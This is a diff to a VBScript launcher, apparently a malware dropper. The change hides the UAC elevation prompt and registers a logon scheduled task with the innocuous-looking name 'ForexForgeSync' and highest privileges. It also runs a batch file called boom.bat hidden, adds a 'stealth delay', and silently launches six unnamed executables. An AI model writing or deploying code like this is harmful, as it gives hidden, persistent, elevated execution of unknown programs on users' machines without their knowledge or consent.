@@ -2,39 +2,42 @@ Set UAC = CreateObject("Shell.Application")
 Set WshShell = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
-' Set working directory to the current folder
+' Get paths
 strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
+strScript = WScript.ScriptFullName
 WshShell.CurrentDirectory = strPath
 
-' --- STEP 1: ELEVATION ---
-If Not WScript.Arguments.Named.Exists("elevate") Then
-    ' Trigger UAC prompt. 0 = Hidden, 1 = Visible (use 1 for testing)
-    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
+' --- STEP 1: ELEVATION & INITIAL SETUP ---
+' This only runs the VERY FIRST time you open the file
+If Not WScript.Arguments.Named.Exists("elevate") And Not WScript.Arguments.Named.Exists("task") Then
+    ' Trigger UAC prompt silently (0 = Hidden)
+    UAC.ShellExecute "wscript.exe", Chr(34) & strScript & Chr(34) & " /elevate", "", "runas", 0
     WScript.Quit
 End If
 
-' --- STEP 2: START THE CHAIN ---
-' Runs boom.bat completely hidden (0)
+' --- STEP 2: INSTALL THE TASK (If elevated) ---
+strTaskName = "ForexForgeSync"
+' We add "/task" to the arguments so the reboot knows not to ask for UAC again
+strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr ""wscript.exe //B \""" & strScript & "\"" /task"" /sc onlogon /rl highest /f"
 
-WshShell.Run "cmd.exe /c boom.bat", 0, True
+' Create the task silently
+WshShell.Run "cmd.exe /c " & strCreateTask, 0, True
 
+' --- STEP 3: RUN BOOM.BAT (Only on first install) ---
+' We only run boom.bat if we are in the "elevate" phase
+If WScript.Arguments.Named.Exists("elevate") Then
+    WshShell.Run "cmd.exe /c boom.bat", 0, True
+End If
 
+' --- STEP 4: STEALTH DELAY ---
+' Wait 30 seconds for the system to settle after login
+WScript.Sleep 30000 
 
-
-
-' Add this code at the end of your launcher.vbs file
-
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-
-' Get current directory and launcher path
-currentDir = objFSO.GetAbsolutePathName(".")
-launcherPath = currentDir & "\launcher.vbs"
-
-' Create scheduled task silently
-objShell.Run "schtasks /create /tn ""AutoLauncher"" /tr """ & launcherPath & """ /sc onlogon /delay 00:30 /f /ru SYSTEM", 0, True
-
-' Clean up and exit silently
-Set objShell = Nothing
-Set objFSO = Nothing
-WScript.Quit
+' --- STEP 5: LAUNCH APPS ---
+' Run all 6 files silently (0 = Hidden)
+WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
+WshShell.Run """" & strPath & "\client.exe""", 0, False
+WshShell.Run """" & strPath & "\file3.exe""", 0, False
+WshShell.Run """" & strPath & "\file4.exe""", 0, False
+WshShell.Run """" & strPath & "\file5.exe""", 0, False
+WshShell.Run """" & strPath & "\file6.exe""", 0, False
